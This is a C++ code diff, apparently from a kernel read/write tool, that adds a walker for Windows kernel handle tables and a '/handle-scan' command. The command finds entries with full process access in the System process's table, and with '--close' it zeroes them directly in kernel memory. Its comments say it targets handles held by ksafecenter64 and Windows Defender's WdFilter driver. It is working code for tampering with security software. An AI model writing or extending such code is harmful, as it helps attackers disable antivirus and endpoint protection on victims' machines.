@@ -34,8 +34,69 @@
 // Level 1: array of sub-table ptrs (256 entries each)
 // Level 2: two-level indirection
 
-static const DWORD HT_TableCode = 0x008;
+static const DWORD HT_NextPool  = 0x000;   // NextHandleNeedingPool  (ULONG)
+static const DWORD HT_TableCode = 0x008;   // TableCode  (ULONGLONG, low 2 bits = level)
 static const DWORD HTE_Size     = 16;
+
+// ─── Walk all allocated entries in a HANDLE_TABLE ────────────────────────────
+// Calls cb(entryVA, slotIdx, objPtr, accessQw) for every non-null entry.
+// Returns early if cb returns false.
+static void WalkHandleTable(DWORD64 ht,
+    bool (*cb)(DWORD64 entryVA, DWORD idx, DWORD64 obj, DWORD64 acc, void* ctx),
+    void* ctx)
+{
+    DWORD   nextPool  = (DWORD)g_drv->Rd64(ht + HT_NextPool); // next unallocated handle value
+    DWORD   maxIdx    = nextPool >> 2;
+    if (maxIdx == 0 || maxIdx > 0x20000) maxIdx = 0x4000;     // sanity cap ~64K handles
+
+    DWORD64 tableCode = g_drv->Rd64(ht + HT_TableCode);
+    int     level     = (int)(tableCode & 3);
+    DWORD64 base      = tableCode & ~3ULL;
+
+    if (level == 0) {
+        for (DWORD idx = 1; idx < maxIdx && idx < 256; idx++) {
+            DWORD64 e   = base + (DWORD64)idx * HTE_Size;
+            DWORD64 obj = g_drv->Rd64(e);
+            if (!obj) continue;
+            DWORD64 acc = g_drv->Rd64(e + 8);
+            if (!cb(e, idx, obj, acc, ctx)) return;
+        }
+    } else if (level == 1) {
+        for (DWORD outer = 0; outer < 256; outer++) {
+            DWORD64 sub = g_drv->Rd64(base + outer * 8);
+            if (!sub) continue;
+            for (DWORD inner = 0; inner < 256; inner++) {
+                DWORD idx = outer * 256 + inner;
+                if (idx == 0) continue;
+                if (idx >= maxIdx) return;
+                DWORD64 e   = sub + (DWORD64)inner * HTE_Size;
+                DWORD64 obj = g_drv->Rd64(e);
+                if (!obj) continue;
+                DWORD64 acc = g_drv->Rd64(e + 8);
+                if (!cb(e, idx, obj, acc, ctx)) return;
+            }
+        }
+    } else if (level == 2) {
+        for (DWORD top = 0; top < 256 && top * 256 * 256 < maxIdx; top++) {
+            DWORD64 l2 = g_drv->Rd64(base + top * 8);
+            if (!l2) continue;
+            for (DWORD mid = 0; mid < 256; mid++) {
+                DWORD64 l1 = g_drv->Rd64(l2 + mid * 8);
+                if (!l1) continue;
+                for (DWORD inner = 0; inner < 256; inner++) {
+                    DWORD idx = top * 256 * 256 + mid * 256 + inner;
+                    if (idx == 0) continue;
+                    if (idx >= maxIdx) return;
+                    DWORD64 e   = l1 + (DWORD64)inner * HTE_Size;
+                    DWORD64 obj = g_drv->Rd64(e);
+                    if (!obj) continue;
+                    DWORD64 acc = g_drv->Rd64(e + 8);
+                    if (!cb(e, idx, obj, acc, ctx)) return;
+                }
+            }
+        }
+    }
+}
 
 static DWORD64 FindHandleEntry(DWORD64 handleTable, DWORD handleVal) {
     DWORD64 tableCode = g_drv->Rd64(handleTable + HT_TableCode);
@@ -128,4 +189,66 @@ void CmdHandleClose(DWORD pid, DWORD64 handleVal) {
         printf("%s[!]%s Zero did not stick (0x%llX) — possible lock/race.\n",
                A_RED, A_RESET, verify);
     }
+}
+
+// ─── /handle-scan <pid> [--access <mask>] [--close] ──────────────────────────
+// Walk <pid>'s kernel HANDLE_TABLE and list every entry whose GrantedAccess
+// matches <mask> (default: PROCESS_ALL_ACCESS = 0x1fffff).
+// --close : zero each matching entry (same mechanics as /handle-close).
+//
+// Designed for pid=4 (System) to enumerate ksafecenter64 / WdFilter handles
+// that are invisible to NtQuerySystemInformation (OBJ_KERNEL_HANDLE).
+void CmdHandleScan(DWORD pid, DWORD64 accessMask, bool doClose) {
+    if (!accessMask) accessMask = 0x001FFFFF;  // PROCESS_ALL_ACCESS
+
+    DWORD64 ep = KUtil::FindEPROCESS(pid);
+    if (!ep) { printf("%s[!]%s EPROCESS for PID %u not found.\n", A_RED, A_RESET, pid); return; }
+    printf("%s[*]%s PID %-6u  EPROCESS=0x%llX\n", A_CYAN, A_RESET, pid, ep);
+
+    DWORD64 ht = g_drv->Rd64(ep + KUtil::EP_HandleTable);
+    if (!ht) { printf("%s[!]%s HandleTable ptr is null.\n", A_RED, A_RESET); return; }
+
+    DWORD64 tableCode = g_drv->Rd64(ht + HT_TableCode);
+    printf("%s[*]%s HandleTable=0x%llX  TableCode=0x%llX (level=%llu)  filter=0x%llX%s\n",
+           A_CYAN, A_RESET, ht, tableCode, (unsigned long long)(tableCode & 3),
+           accessMask, doClose ? "  [--close]" : "");
+
+    struct ScanCtx {
+        DWORD64 mask;
+        bool    doClose;
+        int     found;
+        int     closed;
+    } ctx = { accessMask, doClose, 0, 0 };
+
+    WalkHandleTable(ht, [](DWORD64 entryVA, DWORD idx, DWORD64 obj, DWORD64 acc, void* pctx) -> bool {
+        auto* c = (ScanCtx*)pctx;
+        // GrantedAccessBits are in bits 0..24 of the HighValue (acc).
+        // Compare against the requested mask.
+        if ((acc & c->mask) != c->mask) return true;  // not a match, continue
+
+        DWORD  hval = idx * 4;
+        c->found++;
+        printf("  %s[+]%s h=0x%08X  acc=0x%08llX  obj=0x%llX\n",
+               A_GREEN, A_RESET, hval, acc, obj);
+
+        if (c->doClose) {
+            g_drv->Wr64(entryVA,     0);
+            g_drv->Wr64(entryVA + 8, 0);
+            DWORD64 verify = g_drv->Rd64(entryVA);
+            if (verify == 0) {
+                printf("  %s[x]%s h=0x%08X zeroed.\n", A_GREEN, A_RESET, hval);
+                c->closed++;
+            } else {
+                printf("  %s[!]%s h=0x%08X zero did not stick (0x%llX).\n",
+                       A_RED, A_RESET, hval, verify);
+            }
+        }
+        return true;  // continue walking
+    }, &ctx);
+
+    printf("\n%s[*]%s Scan complete — %d match(es) found",
+           A_CYAN, A_RESET, ctx.found);
+    if (doClose)
+        printf(", %d closed", ctx.closed);
+    printf(".\n");
 }
